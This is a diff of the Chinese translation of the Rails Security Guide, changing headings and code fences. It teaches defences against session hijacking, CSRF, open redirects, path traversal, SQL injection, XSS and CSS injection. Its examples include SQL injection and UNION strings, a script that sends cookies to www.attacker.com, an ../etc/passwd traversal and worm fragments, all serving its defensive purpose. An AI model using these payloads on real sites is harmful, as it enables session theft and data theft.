@@ -14,7 +14,8 @@ Rails 安全指南
 
 --------------------------------------------------------------------------------
 
-## 简介
+简介
+----
 
 网页程序框架的作用是帮助开发者构建网页程序。有些框架还能增强网页程序的安全性。其实框架之间无所谓谁更安全，只要使用得当，就能开发出安全的程序。Rails 提供了很多智能的帮助方法，例如避免 SQL 注入的方法，可以避免常见的安全隐患。我很欣慰，我所审查的 Rails 程序安全性都很高。
 
@@ -26,7 +27,8 @@ Rails 安全指南
 
 为了能开发出安全的网页程序，你必须要了解所用组件的最新安全隐患，做到知己知彼。想了解最新的安全隐患，可以订阅安全相关的邮件列表，阅读关注安全的博客，养成更新和安全检查的习惯。详情参阅“[其他资源](#additional-resources)”一节。我自己也会动手检查，这样才能找到可能引起安全问题的代码。
 
-## 会话
+会话
+----
 
 会话是比较好的切入点，有一些特定的攻击方式。
 
@@ -38,11 +40,10 @@ NOTE: HTTP 是无状态协议，会话让其变成有状态。
 
 会话一般会存储一个 Hash，以及会话 ID。ID 是由 32 个字符组成的字符串，用于识别 Hash。发送给浏览器的每个 cookie 中都包含会话 ID，而且浏览器发送到服务器的每个请求中也都包含会话 ID。在 Rails 程序中，可以使用 `session` 方法保存和读取会话：
 
-{:lang="ruby"}
-~~~
+```ruby
 session[:user_id] = @current_user.id
 User.find(session[:user_id])
-~~~
+```
 
 ### 会话 ID
 
@@ -60,10 +61,9 @@ WARNING: 窃取用户的会话 ID 后，攻击者就能以该用户的身份使�
 
 *   在不加密的网络中嗅听 cookie。无线局域网就是一种不安全的网络。在不加密的无线局域网中，监听网内客户端发起的请求极其容易。这是不建议在咖啡店工作的原因之一。对网页程序开发者来说，可以使用 SSL 建立安全连接避免嗅听。在 Rails 3.1 及以上版本中，可以在程序的设置文件中设置强制使用 SSL 连接：
 
-    {:lang="ruby"}
-    ~~~
+    ```ruby
     config.force_ssl = true
-    ~~~
+    ```
 
 *   大多数用户在公用终端中完工后不清除 cookie。如果前一个用户没有退出网页程序，你就能以该用户的身份继续访问网站。网页程序中一定要提供“退出”按钮，而且要放在特别显眼的位置。
 
@@ -95,8 +95,7 @@ Rails 2 引入了一个新的默认会话存储方式，`CookieStore`。`CookieS
 
 `secrets.secret_key_base` 指定一个密令，程序的会话用其和已知的安全密令比对，避免会话被篡改。`secrets.secret_key_base` 是个随机字符串，保存在文件 `config/secrets.yml` 中：
 
-{:lang="yaml"}
-~~~
+```yaml
 development:
   secret_key_base: a75d...
 
@@ -105,7 +104,7 @@ test:
 
 production:
   secret_key_base: <%= ENV["SECRET_KEY_BASE"] %>
-~~~
+```
 
 Rails 以前版本中的 `CookieStore` 使用 `secret_token`，新版中的 `EncryptedCookieStore` 使用 `secret_key_base`。详细说明参见升级指南。
 
@@ -148,10 +147,9 @@ TIP: 只需一行代码就能避免会话固定攻击。
 
 最有效的对策是，登录成功后重新设定一个新的会话 ID，原来的会话 ID 作废。这样，攻击者就无法使用固定的会话 ID 了。这个对策也能有效避免会话劫持。在 Rails 中重设会话的方式如下：
 
-{:lang="ruby"}
-~~~
+```ruby
 reset_session
-~~~
+```
 
 如果用了流行的 RestfulAuthentication 插件管理用户，要在 `SessionsController#create` 动作中调用 `reset_session` 方法。注意，这个方法会清除会话中的所有数据，**你要把用户转到新的会话中**。
 
@@ -163,8 +161,7 @@ NOTE: 永不过期的会话增加了跨站请求伪造、会话劫持和会话�
 
 cookie 的过期时间可以通过会话 ID 设定。然而，客户端可以修改存储在浏览器中的 cookie，因此在服务器上把会话设为过期更安全。下面的例子把存储在数据库中的会话设为过期。`Session.sweep("20 minutes")` 把二十分钟前的会话设为过期。
 
-{:lang="ruby"}
-~~~
+```ruby
 class Session < ActiveRecord::Base
   def self.sweep(time = 1.hour)
     if time.is_a?(String)
@@ -174,17 +171,17 @@ class Session < ActiveRecord::Base
     delete_all "updated_at < '#{time.ago.to_s(:db)}'"
   end
 end
-~~~
+```
 
 在“会话固定攻击”一节提到过维护会话的问题。虽然上述代码能把会话设为过期，但攻击者每隔五分钟访问一次网站就能让会话始终有效。对此，一个简单的解决办法是在会话数据表中添加 `created_at` 字段，删除很久以前创建的会话。在上面的代码中加入下面的代码即可：
 
-{:lang="ruby"}
-~~~
+```ruby
 delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
   created_at < '#{2.days.ago.to_s(:db)}'"
-~~~
+```
 
-## 跨站请求伪造
+跨站请求伪造
+----------
 
 跨站请求伪造（cross-site request forgery，简称 CSRF）攻击的方法是在页面中包含恶意代码或者链接，攻击者认为被攻击的用户有权访问另一个网站。如果用户在那个网站的会话没有过期，攻击者就能执行未经授权的操作。
 
@@ -223,8 +220,7 @@ HTTP 协议提供了两种主要的基本请求类型，GET 和 POST（当然还
 
 **POST 请求也能自动发送。**举个例子，下面这个链接虽在浏览器的状态栏中显示的目标地址是 www.harmless.com，但其实却动态地创建了一个表单，发起 POST 请求。
 
-{:lang="html"}
-~~~
+```html
 <a href="http://www.harmless.com/" onclick="
   var f = document.createElement('form');
   f.style.display = 'none';
@@ -233,41 +229,39 @@ HTTP 协议提供了两种主要的基本请求类型，GET 和 POST（当然还
   f.action = 'http://www.example.com/account/destroy';
   f.submit();
   return false;">To the harmless survey</a>
-~~~
+```
 
 攻击者还可以把代码放在图片的 `onmouseover` 事件句柄中：
 
-{:lang="html"}
-~~~
+```html
 <img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
-~~~
+```
 
 伪造请求还有其他方式，例如使用 `<script>` 标签向返回 JSONP 或 JavaScript 的地址发起跨站请求。响应是可执行的代码，攻击者能找到方法执行其中的代码，获取敏感数据。为了避免这种数据泄露，可以禁止使用跨站 `<script>` 标签，只允许使用 Ajax 请求获取 JavaScript 响应，因为 XmlHttpRequest 遵守同源原则，只有自己的网站才能发起请求。
 
 为了防止其他伪造请求，我们可以使用安全权标，这个权标只有自己的网站知道，其他网站不知道。我们要在请求中加入这个权标，且要在服务器上做验证。这些操作只需在控制器中加入下面这行代码就能完成：
 
-{:lang="ruby"}
-~~~
+```ruby
 protect_from_forgery
-~~~
+```
 
 加入这行代码后，Rails 生成的所有表单和 Ajax 请求中都会包含安全权标。如果安全权标和预期的值不一样，程序会重置会话。
 
 一般来说最好使用持久性 cookie 存储用户的信息，例如 `cookies.permanent`。此时，cookie 不会被清除，而且自动加入的 CSRF 保护措施也不会受到影响。如果此类信息没有使用会话存储在 cookie 中，就要自己动手处理：
 
-{:lang="ruby"}
-~~~
+```ruby
 def handle_unverified_request
   super
   sign_out_user # Example method that will destroy the user cookies.
 end
-~~~
+```
 
 上述代码可以放到 `ApplicationController` 中，如果非 GET 请求中没有 CSRF 权标就会调用这个方法。
 
 注意，跨站脚本攻击会跳过所有 CSRF 保护措施。攻击者通过跨站脚本可以访问页面中的所有元素，因此能读取表单中的 CSRF 安全权标或者直接提交表单。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。
 
-## 重定向和文件
+重定向和文件
+----------
 
 有一种安全漏洞由网页程序中的重定向和文件引起。
 
@@ -277,18 +271,17 @@ WARNING: 网页程序中的重定向是个被低估的破坏工具：攻击者�
 
 只要允许用户指定重定向地址，就有可能被攻击。最常见的攻击方式是把用户重定向到一个和正牌网站看起来一模一样虚假网站。这叫做“钓鱼攻击”。攻击者把不会被怀疑的链接通过邮件发给用户，在链接中注入跨站脚本，或者把链接放在其他网站中。用户之所以不怀疑，是因为链接以熟知的网站域名开头，转向恶意网站的地址隐藏在重定向参数中，例如 http://www.example.com/site/redirect?to= www.attacker.com。我们来看下面这个 `legacy` 动作：
 
-{:lang="ruby"}
-~~~
+```ruby
 def legacy
   redirect_to(params.update(action:'main'))
 end
-~~~
+```
 
 如果用户访问 `legacy` 动作，会转向 `main` 动作。其作用是保护 URL 参数，将其转向 `main` 动作。但是，如果攻击者在 URL 中指定 `host` 参数仍能用来攻击：
 
-~~~
+```
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
-~~~
+```
 
 如果 `host` 参数出现在地址的末尾，用户很难察觉，最终被重定向到 attacker.com。对此，一种简单的对策是只允许在 `legacy` 动作中使用指定的参数（使用白名单，而不是删除不该使用的参数）。如果重定向到一个地址，要通过白名单或正则表达式检查目标地址。
 
@@ -296,9 +289,9 @@ http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
 
 还有一种重定向和独立跨站脚本攻击可通过在 Firefox 和 Opera 中使用 data 协议实现。data 协议直接把内容显示在浏览器中，可以包含任何 HTML 或 JavaScript，以及完整的图片：
 
-~~~
+```
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
-~~~
+```
 
 这是个使用 Base64 编码的 JavaScript 代码，显示一个简单的弹出窗口。在重定向地址中，攻击者可以通过这段恶意代码把用户引向这个地址。对此，一个对策是禁止用户指定重定向的地址。
 
@@ -310,8 +303,7 @@ NOTE: 确保上传的文件不会覆盖重要的文件，而且要异步处理�
 
 过滤用户上传文件的文件名时，不要只删除恶意部分。设想这样一种情况，网页程序删除了文件名中的所有 `../`，但是攻击者可以使用 `....//`，得到的结果还是 `../`。最好使用白名单，确保文件名中只包含指定的字符。这和黑名单的做法不同，黑名单只是简单的把不允许使用的字符删掉。如果文件名不合法，拒绝使用即可（或者替换成允许使用的字符），不要删除不可用的字符。下面这个文件名清理方法摘自 [attachment_fu](https://github.com/technoweenie/attachment_fu/tree/master) 插件。
 
-{:lang="ruby"}
-~~~
+```ruby
 def sanitize_filename(filename)
   filename.strip.tap do |name|
     # NOTE: File.basename doesn't work right with Windows paths on Unix
@@ -322,7 +314,7 @@ def sanitize_filename(filename)
     name.gsub! /[^\w\.\-]/, '_'
   end
 end
-~~~
+```
 
 同步处理文件上传一个明显的缺点是，容易受到“拒绝服务”（denial-of-service，简称 DOS）攻击。攻击者可以同时在多台电脑上上传图片，增加服务器负载，最终有可能导致服务器宕机。
 
@@ -342,25 +334,24 @@ NOTE: 确保用户不能随意下载文件。
 
 就像过滤上传文件的文件名一样，下载文件时也要这么做。`send_file()` 方法可以把服务器上的文件发送到客户端，如果不过滤用户提供的文件名，可以下载任何一个文件：
 
-{:lang="ruby"}
-~~~
+```ruby
 send_file('/var/www/uploads/' + params[:filename])
-~~~
+```
 
 把文件名设为 `../../../etc/passwd` 就能下载服务器的登录信息。一个简单的对策是，检查请求的文件是否在指定的文件夹中：
 
-{:lang="ruby"}
-~~~
+```ruby
 basename = File.expand_path(File.join(File.dirname(__FILE__), '../../files'))
 filename = File.expand_path(File.join(basename, @file.public_filename))
 raise if basename !=
      File.expand_path(File.join(File.dirname(filename), '../../../'))
 send_file filename, disposition: 'inline'
-~~~
+```
 
 另外一种方法是把文件名保存在数据库中，然后用数据库中的 ID 命名存储在硬盘上的文件。这样也能有效避免执行上传文件中的代码。attachment_fu 插件使用的就是类似方式。
 
-## 局域网和管理界面的安全
+局域网和管理界面的安全
+-------------------
 
 局域网和管理界面是常见的攻击目标，因为这些地方有访问特权。局域网和管理界面需要多种安全防护措施，但实际情况却不理想。
 
@@ -392,7 +383,8 @@ XSS 的对策参阅“[注入](#injection)”一节。在局域网和管理界�
 
 * 把管理界面放到单独的子域名中，例如 admin.application.com，使用独立的程序及用户管理系统。这样就不可能从 www.application.com 中窃取管理密码了，因为浏览器中有同源原则：注入 www.application.com 中的跨站脚本无法读取 admin.application.com 中的 cookie，反之亦然。
 
-## 用户管理
+用户管理
+-------
 
 NOTE: 几乎每个网页程序都要处理权限和认证。不要自己实现这些功能，推荐使用常用的插件，而且要及时更新。除此之外还有一些预防措施，可以让程序更安全。
 
@@ -400,24 +392,22 @@ Rails 身份认证插件很多，比较好的有 [devise](https://github.com/pla
 
 注册后程序会生成一个激活码，用户会收到一封包含激活链接的邮件。激活账户后，数据库中的 `activation_code` 字段被设为 `NULL`。如果有人访问类似的地址，就能以在数据库中查到的第一个激活的用户身份登录程序，这个用户极有可能是管理员：
 
-~~~
+```
 http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=
-~~~
+```
 
 这么做之所以可行，是因为在某些服务器上，访问上述地址后，ID 参数（`params[:id]`）的值是 `nil`。查找激活码的方法如下：
 
-{:lang="ruby"}
-~~~
+```ruby
 User.find_by_activation_code(params[:id])
-~~~
+```
 
 如果 ID 为 `nil`，生成的 SQL 查询如下：
 
-{:lang="sql"}
-~~~
+```sql
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
-~~~
+```
 
 查询到的是数据库中的第一个用户，返回给动作并登入该用户。详细说明参见[我博客上的文章](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)。因此建议经常更新插件。而且，审查程序的代码也可以发现类似问题。
 
@@ -477,10 +467,9 @@ WARNING: 告诉 Rails 不要把密码写入日志。
 
 默认情况下，Rails 会把请求的所有信息写入日志。日志文件是个严重的安全隐患，因为其中可能包含登录密码和信用卡卡号等。考虑程序的安全性时，要想到攻击者获得服务器控制权这一情况。如果把明文密码写入日志，数据库再怎么加密也无济于事。在程序的设置文件中可以通过 `config.filter_parameters` 过滤指定的请求参数，不写入日志。过滤掉的参数在日志中会使用 `[FILTERED]` 代替。
 
-{:lang="ruby"}
-~~~
+```ruby
 config.filter_parameters << :password
-~~~
+```
 
 ### 好密码
 
@@ -500,42 +489,38 @@ NOTE: 使用 Ruby 正则表达式时经常犯的错误是使用 `^` 和 `$` 分�
 
 Ruby 使用了有别于其他编程语言的方式来匹配字符串的开头和结尾。这也是为什么很多 Ruby/Rails 相关的书籍都搞错了。为什么这是个安全隐患呢？如果想不太严格的验证 URL 字段，使用了如下的正则表达式：
 
-{:lang="ruby"}
-~~~
+```ruby
 /^https?:\/\/[^\n]+$/i
-~~~
+```
 
 在某些编程语言中可能没问题，但在 Ruby 中，`^` 和 `$` 分别匹配一行的开头和结尾。因此下面这种 URL 能通过验证：
 
-~~~
+```
 javascript:exploit_code();/*
 http://hi.com
 */
-~~~
+```
 
 之所以能通过，是因为第二行匹配了正则表达式，其他两行无关紧要。假设在视图中要按照下面的方式显示 URL：
 
-{:lang="ruby"}
-~~~
+```ruby
 link_to "Homepage", @user.homepage
-~~~
+```
 
 访问者不会觉得这个链接有问题，点击之后，却执行了 `exploit_code` 这个 JavaScript 函数，或者攻击者提供的其他 JavaScript 代码。
 
 修正这个正则表达式的方法是，分别用 `\A` 和 `\z` 代替 `^` 和 `$`，如下所示：
 
-{:lang="ruby"}
-~~~
+```ruby
 /\Ahttps?:\/\/[^\n]+\z/i
-~~~
+```
 
 因为这种问题经常出现，如果使用的正则表达式以 `^` 开头，或者以 `$` 结尾，格式验证器（`validates_format_of`）会抛出异常。如果确实需要使用 `^` 和 `$`（但很少见），可以把 `:multiline` 选项设为 `true`，如下所示：
 
-{:lang="ruby"}
-~~~
+```ruby
 # content should include a line "Meanwhile" anywhere in the string
 validates :content, format: { with: /^Meanwhile$/, multiline: true }
-~~~
+```
 
 注意，这种方式只能避免格式验证中出现的常见错误。你要牢记，在 Ruby 中 `^` 和 `$` 分别匹配**行**的开头和结尾，不是整个字符串的开头和结尾。
 
@@ -545,23 +530,22 @@ WARNING: 只需修改一个参数就可能赋予用户未授权的权限。记�
 
 用户最可能篡改的参数是 ID，例如在 `http://www.domain.com/project/1` 中，ID 为 1，这个参数的值在控制器中可通过 `params` 获取。在控制器中可能会做如下的查询：
 
-{:lang="ruby"}
-~~~
+```ruby
 @project = Project.find(params[:id])
-~~~
+```
 
 在某些程序中这么做没问题，但如果用户没权限查看所有项目就不能这么做。如果用户把 ID 改为 42，但其实无权查看这个项目的信息，用户还是能够看到。我们应该同时查询用户的访问权限：
 
-{:lang="ruby"}
-~~~
+```ruby
 @project = @current_user.projects.find(params[:id])
-~~~
+```
 
 不同的程序用户可篡改的参数也不同，谨记一个原则，用户输入的数据未经验证之前都是不安全的，传入的每个参数都有潜在危险。
 
 别傻了，隐藏参数或者使用 JavaScript 根本就无安全性可言。使用 Firefox 的开发者工具可以修改表单中的每个隐藏字段。JavaScript 只能验证用户的输入数据，但不能避免攻击者发送恶意请求。Firefox 的 Live Http Headers 插件可以记录每次请求，而且能重复请求或者修改请求内容，很容易就能跳过 JavaScript 验证。有些客户端代理还能拦截任意请求和响应。
 
-## 注入
+注入
+---
 
 NOTE: 注入这种攻击方式可以把恶意代码或参数写入程序，在程序所谓安全的环境中执行。常见的注入方式有跨站脚本和 SQL 注入。
 
@@ -589,17 +573,15 @@ NOTE: Rails 中的方法足够智能，能避免 SQL 注入。但 SQL 注入是�
 
 SQL 注入通过修改传入程序的参数，影响数据库查询。常见目的是跳过授权管理系统，处理数据或读取任意数据。下面举例说明为什么要避免在查询中使用用户输入的数据。
 
-{:lang="ruby"}
-~~~
+```ruby
 Project.where("name = '#{params[:name]}'")
-~~~
+```
 
 这个查询可能出现在搜索动作中，用户输入想查找的项目名。如果恶意用户输入 `' OR 1 --`，得到的 SQL 查询为：
 
-{:lang="sql"}
-~~~
+```sql
 SELECT * FROM projects WHERE name = '' OR 1 --'
-~~~
+```
 
 两根横线表明注释开始，后面所有的语句都会被忽略。所以上述查询会读取 `projects` 表中所有记录，包括向用户隐藏的记录。这是因为所有记录都满足查询条件。
 
@@ -607,17 +589,15 @@ SELECT * FROM projects WHERE name = '' OR 1 --'
 
 网页程序中一般都有访问控制功能。用户输入登录密令后，网页程序试着在用户数据表中找到匹配的记录。如果找到了记录就赋予用户相应的访问权限。不过，攻击者可通过 SQL 注入跳过这种检查。下面显示了 Rails 中一个常见的数据库查询，在用户表中查询匹配用户输入密令的第一个记录。
 
-{:lang="ruby"}
-~~~
+```ruby
 User.first("login = '#{params[:name]}' AND password = '#{params[:password]}'")
-~~~
+```
 
 如果用户输入的 `name` 参数值为 `' OR '1'='1`，`password` 参数的值为 `' OR '2'>'1`，得到的 SQL 查询为：
 
-{:lang="sql"}
-~~~
+```sql
 SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
-~~~
+```
 
 这个查询直接在数据库中查找第一个记录，然后赋予其相应的权限。
 
@@ -625,24 +605,22 @@ SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIM
 
 `UNION` 语句连接两个 SQL 查询，返回的结果只有一个集合。攻击者利用 `UNION` 语句可以从数据库中读取任意数据。下面来看个例子：
 
-{:lang="ruby"}
-~~~
+```ruby
 Project.where("name = '#{params[:name]}'")
-~~~
+```
 
 注入一个使用 `UNION` 语句的查询：
 
-~~~
+```
 ') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
-~~~
+```
 
 得到的 SQL 查询如下：
 
-{:lang="sql"}
-~~~
+```sql
 SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
-~~~
+```
 
 上述查询的结果不是一个项目集合（因为找不到没有名字的项目），而是一组由用户名和密码组成的集合。真希望你加密了存储在数据库中的密码！攻击者要为两个查询语句提供相同的字段数量。所以在第二个查询中有很多 `1`。攻击者可以总是使用 `1`，只要字段的数量和第一个查询一样即可。
 
@@ -654,17 +632,15 @@ Rails 内建了能过滤 SQL 中特殊字符的过滤器，会转义 `'`、`"`�
 
 请不要直接传入条件语句，而要传入一个数组，进行过滤。如下所示：
 
-{:lang="ruby"}
-~~~
+```ruby
 Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
-~~~
+```
 
 如上所示，数组的第一个元素是包含问号的 SQL 片段，要过滤的内容是数组其后的元素，过滤后的值会替换第一个元素中的问号。传入 Hash 的作用相同：
 
-{:lang="ruby"}
-~~~
+```ruby
 Model.where(login: entered_user_name, password: entered_password).first
-~~~
+```
 
 数组或 Hash 形式只能在模型实例上使用。其他地方可使用 `sanitize_sql()` 方法。在 SQL 中使用外部字符串时要时刻警惕安全性。
 
@@ -690,40 +666,36 @@ NOTE: 网页程序中影响范围最广、危害性最大的安全漏洞是跨�
 
 下面是一段最直接的跨站脚本：
 
-{:lang="html"}
-~~~
+```html
 <script>alert('Hello');</script>
-~~~
+```
 
 上面的 JavaScript 只是显示一个提示框。下面的例子作用相同，但放在不太平常的地方：
 
-{:lang="html"}
-~~~
+```html
 <img src=javascript:alert('Hello')>
 <table background="javascript:alert('Hello')">
-~~~
+```
 
 ##### 盗取 cookie
 
 上面的例子没什么危害，下面来看一下攻击者如何盗取用户 cookie（因此也能劫持会话）。在 JavaScript 中，可以使用 `document.cookie` 读写 cookie。JavaScript 强制使用同源原则，即一个域中的脚本无法访问另一个域中的 cookie。`document.cookie` 属性中保存的 cookie 来自源服务器。不过，如果直接把代码放在 HTML 文档中（就跟跨站脚本一样），就可以读写这个属性。把下面的代码放在程序的任何地方，看一下页面中显示的 cookie 值：
 
-{:lang="html"}
-~~~
+```html
 <script>document.write(document.cookie);</script>
-~~~
+```
 
 对攻击者来说，这么做没什么用，因为用户看到了自己的 cookie。下面这个例子会从 http://www.attacker.com/ 加载一个图片和 cookie。当然，这个地址并不存在，因此浏览器什么也不会显示。但攻击者可以查看服务器的访问日志获取用户的 cookie。
 
-{:lang="html"}
-~~~
+```html
 <script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
-~~~
+```
 
 www.attacker.com 服务器上的日志文件中可能有这么一行记录：
 
-~~~
+```
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
-~~~
+```
 
 在 cookie 中加上 [httpOnly](http://dev.rubyonrails.org/ticket/8895) 标签可以避免这种攻击，加上 httpOnly 后，JavaScript 就无法读取 `document.cookie` 属性的值。IE v6.SP1、Firefox v2.0.0.5 和 Opera 9.5 都支持只能使用 HTTP 请求访问的 cookie，Safari 还在考虑这个功能，暂时会忽略这个选项。但在其他浏览器，或者旧版本的浏览器（例如 WebTV 和 Mac 系统中的 IE 5.5）中无法加载页面。有一点要注意，使用 [Ajax 仍可读取 cookie](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)。
 
@@ -731,21 +703,20 @@ GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 
 攻击者可通过网页涂改做很多事情，例如，显示错误信息，或者引导用户到攻击者的网站，偷取登录密码或者其他敏感信息。最常见的涂改方法是使用 iframe 加载外部代码：
 
-{:lang="html"}
-~~~
+```html
 <iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
-~~~
+```
 
 iframe 可以从其他网站加载任何 HTML 和 JavaScript。上述 iframe 是使用 [Mpack 框架](http://isc.sans.org/diary.html?storyid=3015)攻击意大利网站的真实代码。Mpack 尝试通过浏览器的安全漏洞安装恶意软件，成功率很高，有 50% 的攻击成功了。
 
 更特殊的攻击是完全覆盖整个网站，或者显示一个登陆框，看去来和原网站一模一样，但把用户名和密码传给攻击者的网站。还可使用 CSS 或 JavaScript 把网站中原来的链接隐藏，换上另一个链接，把用户带到仿冒网站上。
 
-还有一种攻击方式不保存信息，把恶意代码包含在 URL 中。如果搜索表单不过滤搜索关键词，这种攻击就更容易实现。下面这个链接显示的页面中包含这句话“乔治&bull;布什任命 9 岁男孩为主席...”：
+还有一种攻击方式不保存信息，把恶意代码包含在 URL 中。如果搜索表单不过滤搜索关键词，这种攻击就更容易实现。下面这个链接显示的页面中包含这句话“乔治·布什任命 9 岁男孩为主席...”：
 
-~~~
+```
 http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
-~~~
+```
 
 ##### 对策
 
@@ -755,18 +726,16 @@ NOTE: 过滤恶意输入很重要，转义输出也同样重要。
 
 假设黑名单从用户的输入值中删除了 `script`，但如果攻击者输入 `<scrscriptipt>`，过滤后剩余的值是 `<script>`。在以前版本的 Rails 中，`strip_tags()`、`strip_links()` 和 `sanitize()` 方法使用黑名单。所以下面这种注入完全可行：
 
-{:lang="ruby"}
-~~~
+```ruby
 strip_tags("some<<b>script>alert('hello')<</b>/script>")
-~~~
+```
 
 上述方法的返回值是 `some<script>alert('hello')</script>`，仍然可以发起攻击。所以我才支持使用白名单，使用 Rails 2 中升级后的 `sanitize()` 方法：
 
-{:lang="ruby"}
-~~~
+```ruby
 tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
 s = sanitize(user_input, tags: tags, attributes: %w(href title))
-~~~
+```
 
 这个方法只允许使用指定的标签，效果很好，能对付各种诡计和改装的标签。
 
@@ -776,10 +745,10 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 网络流量大都使用有限的西文字母传输，所以后来出现了新的字符编码方式传输其他语种的字符。这也为网页程序带来了新的威胁，因为恶意代码可以隐藏在不同的编码字符中，浏览器可以处理这些编码，但网页程序不一定能处理。下面是使用 UTF-8 编码攻击的例子：
 
-~~~
+```
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-~~~
+```
 
 上面的代码会弹出一个提示框。`sanitize()` 方法可以识别这种代码。编码字符串的一个好用工具是 [Hackvertor](https://hackvertor.co.uk/public)，使用这个工具可以做到知己知彼。Rails 的 `sanitize()` 方法能有效避免编码攻击。
 
@@ -789,11 +758,11 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 下面的代码摘自针对 Yahoo! 邮件的[蠕虫病毒](http://groovin.net/stuff/yammer.txt)，由 [Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) 制作，发生在 2006 年 6 月 11 日，是第一个针对网页邮件客户端的蠕虫病毒：
 
-~~~
+```
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
-~~~
+```
 
 这个蠕虫病毒利用 Yahoo 的 HTML/JavaScript 过滤器漏洞。这个过滤器过滤标签中所有的 `target` 和 `onload` 属性，因为这两个属性的值可以是 JavaScript 代码。这个过滤器只会执行一次，所以包含蠕虫病毒代码的 `onload` 属性不会被过滤掉。这个例子很好的说明了黑名单很难以偏概全，也说明了在网页程序中为什么很难提供输入 HTML/JavaScript 的支持。
 
@@ -811,31 +780,27 @@ CSS 注入的原理可以通过有名的 [MySpace Samy 蠕虫](http://namb.la/po
 
 MySpace 禁止使用很多标签，但却允许使用 CSS。所以，蠕虫的作者按照下面的方式在 CSS 中加入了 JavaScript 代码：
 
-{:lang="html"}
-~~~
+```html
 <div style="background:url('javascript:alert(1)')">
-~~~
+```
 
 因此问题的关键是 `style` 属性，但属性的值中不能含有引号，因为单引号和双引号都已经使用了。但是 JavaScript 中有个很实用的 `eval()` 函数，可以执行任意字符串：
 
-{:lang="html"}
-~~~
+```html
 <div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
-~~~
+```
 
 `eval()` 函数对黑名单过滤来说是个噩梦，可以把 `innerHTML` 隐藏在 `style` 属性中：
 
-{:lang="js"}
-~~~
+```js
 alert(eval('document.body.inne' + 'rHTML'));
-~~~
+```
 
 MySpace 会过滤 `javascript` 这个词，所以蠕虫作者使用 `java<NEWLINE>script` 绕过了这个限制：
 
-{:lang="html"}
-~~~
+```html
 <div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
-~~~
+```
 
 蠕虫作者面对的另一个问题是 CSRF 安全权标。没有安全权标就无法通过 POST 请求发送好友请求。蠕虫作者先向页面发起 GET 请求，然后再添加用户，处理 CSRF 权标。
 
@@ -853,27 +818,24 @@ CSS 中的 [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html)
 
 例如，RedCloth 会把 `_test_` 转换成 `<em>test</em>`，斜体显示文字。不过到最新的 3.0.4 版本，仍然有跨站脚本漏洞。请安装已经解决安全问题的[全新第 4 版](http://www.redcloth.org)。可是这个版本还有[一些安全隐患](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)。下面的例子针对 V3.0.4：
 
-{:lang="ruby"}
-~~~
+```ruby
 RedCloth.new('<script>alert(1)</script>').to_html
 # => "<script>alert(1)</script>"
-~~~
+```
 
 使用 `:filter_html` 选项可以过滤不是由 RedCloth 生成的 HTML：
 
-{:lang="ruby"}
-~~~
+```ruby
 RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
 # => "alert(1)"
-~~~
+```
 
 不过，这个选项不能过滤全部的 HTML，会留下一些标签（程序就是这样设计的），例如 `<a>`：
 
-{:lang="ruby"}
-~~~
+```ruby
 RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 # => "<p><a href="javascript:alert(1)">hello</a></p>"
-~~~
+```
 
 #### 对策
 
@@ -893,11 +855,10 @@ NOTE: 使用用户输入的命令行参数时要小心。
 
 为了避免这类问题，可以使用 `system(command, parameters)` 方法，这样传入的命令行参数更安全。
 
-{:lang="ruby"}
-~~~
+```ruby
 system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
-~~~
+```
 
 ### 报头注入
 
@@ -907,31 +868,30 @@ HTTP 请求报头中包含 `Referer`，`User-Agent`（客户端软件）和 `Coo
 
 除此之外，基于用户输入值构建响应报头时还要格外小心。例如，把用户重定向到指定的页面。重定向时需要在表单中加入 `referer` 字段：
 
-{:lang="ruby"}
-~~~
+```ruby
 redirect_to params[:referer]
-~~~
+```
 
 Rails 会把这个字段的值提供给 `Location` 报头，并向浏览器发送 302（重定向）状态码。恶意用户可以做的第一件事是：
 
-~~~
+```
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
-~~~
+```
 
 Rails 2.1.2 之前有个漏洞，黑客可以注入任意的报头字段，例如：
 
